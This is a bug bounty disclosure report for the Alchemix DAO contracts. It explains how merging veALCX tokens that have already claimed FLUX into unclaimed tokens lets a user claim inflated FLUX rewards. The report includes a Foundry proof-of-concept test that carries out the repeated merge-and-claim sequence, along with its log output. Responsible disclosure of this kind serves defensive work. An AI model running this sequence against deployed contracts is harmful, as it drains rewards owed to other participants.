# 31512 - \[SC - Critical] Infinite minting of FLUX through Merge

Submitted on May 20th 2024 at 22:10:34 UTC by @Django for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31512

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

Users are able to claim more FLUX rewards than they should simply by merging their tokens. Since the `merge()` operation increases the `_to` token's balance, the `_from` token can simply increment its unclaimed FLUX through `voter.reset()` and then merge its balance into `_to`. Then `_to` can claim with the increased balance. This operation can continue for as many iterations as desired.

## Vulnerability Details

Users increase their unclaimed FLUX balance through `voter.reset()` for their tokens after an epoch has passed. They can then claim their FLUX by calling `FLUX.claimFlux()`.

However, since the `claimableFlux()` FLUX balance of each token is taken at the current `block.timestamp`, a user can simply call `votingEscrow.merge()` to merge their already claimed tokens with an unclaimed token, increasing its balance and effectively doubling their rewards to claim.

```
    function claimableFlux(uint256 _tokenId) public view returns (uint256) {
        // If the lock is expired, no flux is claimable at the current epoch
        if (block.timestamp > locked[_tokenId].end) {
            return 0;
        }


        // Amount of flux claimable is <fluxPerVeALCX> percent of the balance
        return (_balanceOfTokenAt(_tokenId, block.timestamp) * fluxPerVeALCX) / BPS;
    }
```

## Impact Details

* Unauthorized claiming of FLUX rewards

## Output from POC

```
[PASS] testAccrueFluxByMergeAndReset() (gas: 4170557)
Logs:
  **Each token should receive 984462360468700917 tokens per epoch
  Claim token1. It claims 1x rewards (normal)
  FLUX Balance 984462360468700917
  --------------------
  Merge the already claimed token1 to the unclaimed token2. Token2's balance increases.
  Claim token2. It claims 2x rewards.
  FLUX Balance 2953387081421625754
  --------------------
  Merge the already claimed token2 to the unclaimed token3. Token3's balance increases.
  Claim token3. It claims 4x rewards.
  FLUX Balance 5906774162843251509
  --------------------
  Merge the already claimed token3 to the unclaimed token4. Token4's balance increases.
  Claim token4. It claims 8x rewards.
  FLUX Balance 9844623604749101184
  --------------------
  After 3 merges, user has claimed 250% more rewards (10x/4x)
```

## Proof of Concept

```
function testAccrueFluxByMergeAndReset() public {
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId2 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId3 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
        uint256 tokenId4 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);

        hevm.startPrank(admin);

        uint256 claimedBalance = flux.balanceOf(admin);
        uint256 unclaimedBalance = flux.getUnclaimedFlux(tokenId1);

        assertEq(claimedBalance, 0);
        assertEq(unclaimedBalance, 0);

        // Reset token1 to claim the usual amount of flux
        voter.reset(tokenId1);
        unclaimedBalance = flux.getUnclaimedFlux(tokenId1);
        console.log("**Each token should receive %i tokens per epoch", unclaimedBalance);
        console.log("Claim token1. It claims 1x rewards (normal)");
        flux.claimFlux(tokenId1, flux.getUnclaimedFlux(tokenId1));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token1 to the unclaimed token2. Token2's balance increases.");
        veALCX.merge(tokenId1, tokenId2);

        console.log("Claim token2. It claims 2x rewards.");
        voter.reset(tokenId2);
        flux.claimFlux(tokenId2, flux.getUnclaimedFlux(tokenId2));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token2 to the unclaimed token3. Token3's balance increases.");
        veALCX.merge(tokenId2, tokenId3);

        console.log("Claim token3. It claims 4x rewards.");
        voter.reset(tokenId3);
        flux.claimFlux(tokenId3, flux.getUnclaimedFlux(tokenId3));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("Merge the already claimed token3 to the unclaimed token4. Token4's balance increases.");
        veALCX.merge(tokenId3, tokenId4);

        console.log("Claim token4. It claims 8x rewards.");
        voter.reset(tokenId4);
        flux.claimFlux(tokenId4, flux.getUnclaimedFlux(tokenId4));
        console.log("FLUX Balance %s", flux.balanceOf(admin));
        console.log("--------------------");

        console.log("After 3 merges, user has claimed 250% more rewards (10x/4x)");

        hevm.stopPrank();
    }
```
